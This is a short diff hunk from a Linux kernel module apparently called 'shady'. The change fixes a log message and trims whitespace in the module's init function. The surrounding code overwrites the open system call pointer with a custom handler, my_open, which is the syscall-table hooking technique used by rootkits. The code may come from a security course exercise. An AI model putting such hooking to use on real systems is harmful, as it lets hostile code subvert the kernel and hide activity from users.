@@ -242,12 +242,8 @@ shady_init_module(void)
   old_open = (void*) *(int*)open_pointer;
   printk("Old open function is at:    0x%x\n", (int)old_open);
   *(int*)open_pointer = (int)my_open;
-  printk("Open now calls fucntion at: 0x%x\n", *(int*)oldOpenPointer);
-  
-
-
-  
-	
+  printk("Open now calls fucntion at: 0x%x\n", *(int*)open_pointer);
+  	
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
